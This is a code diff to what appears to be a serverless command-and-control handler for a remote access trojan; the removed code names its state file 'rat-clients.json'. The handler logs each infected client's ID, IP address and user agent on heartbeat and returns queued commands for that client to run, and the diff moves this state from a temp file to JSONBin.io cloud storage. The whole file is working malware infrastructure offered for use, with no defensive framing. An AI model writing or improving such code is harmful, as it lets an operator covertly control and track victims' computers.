@@ -1,37 +1,8 @@
 const { createHmac } = require('crypto');
 
-// Shared storage (for production, use a database)
-let clients = new Map();
-let commands = new Map();
-
-// Try to use shared storage
-try {
-  const fs = require('fs');
-  const path = require('path');
-  const os = require('os');
-  
-  // Use temp file for sharing data between functions
-  const tempFile = path.join(os.tmpdir(), 'rat-clients.json');
-  
-  if (fs.existsSync(tempFile)) {
-    const data = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
-    clients = new Map(data.clients || []);
-    commands = new Map(data.commands || []);
-  }
-  
-  // Function to save state
-  function saveState() {
-    fs.writeFileSync(tempFile, JSON.stringify({
-      clients: Array.from(clients.entries()),
-      commands: Array.from(commands.entries())
-    }));
-  }
-  
-  // Auto-save every 5 seconds
-  setInterval(saveState, 5000);
-} catch (e) {
-  console.log('Shared storage not available, using in-memory');
-}
+// Use JSONBin.io for free persistent storage
+const JSONBIN_API_KEY = process.env.JSONBIN_API_KEY;
+const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID;
 
 const AUTH_TOKEN = process.env.AUTH_TOKEN || 'default-token-change-me';
 
@@ -42,6 +13,37 @@ function verifyAuth(event) {
 
 function getClientId(event) {
   return event.headers['x-client-id'] || 'unknown';
+}
+
+// Get current data from JSONBin
+async function getBinData() {
+  try {
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
+      headers: {
+        'X-Master-Key': JSONBIN_API_KEY
+      }
+    });
+    const data = await response.json();
+    return data.record || { clients: {}, commands: {} };
+  } catch (error) {
+    return { clients: {}, commands: {} };
+  }
+}
+
+// Update data in JSONBin
+async function updateBinData(data) {
+  try {
+    await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+      method: 'PUT',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': JSONBIN_API_KEY
+      },
+      body: JSON.stringify(data)
+    });
+  } catch (error) {
+    console.error('Failed to update bin:', error);
+  }
 }
 
 exports.handler = async (event, context) => {
@@ -70,19 +72,25 @@ exports.handler = async (event, context) => {
     const clientId = getClientId(event);
     const timestamp = Date.now();
 
+    // Get current data
+    const binData = await getBinData();
+
     // Update client heartbeat
-    clients.set(clientId, {
+    binData.clients[clientId] = {
       lastSeen: timestamp,
       ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'unknown',
       userAgent: event.headers['user-agent'] || 'unknown'
-    });
+    };
 
     // Check for pending commands
-    const pendingCommand = commands.get(clientId);
+    const pendingCommand = binData.commands[clientId];
     
     if (pendingCommand) {
       // Remove command after retrieval
-      commands.delete(clientId);
+      delete binData.commands[clientId];
+      
+      // Update bin with removed command
+      await updateBinData(binData);
       
       return {
         statusCode: 200,
@@ -95,13 +103,16 @@ exports.handler = async (event, context) => {
       };
     }
 
+    // Update bin with new heartbeat
+    await updateBinData(binData);
+
     return {
       statusCode: 200,
       headers,
       body: JSON.stringify({
-        status: 'heartbeat_received',
+        status: 'ok',
         timestamp: timestamp,
-        next_check: 5000 // Check again in 5 seconds
+        next_check: 5000
       })
     };
 
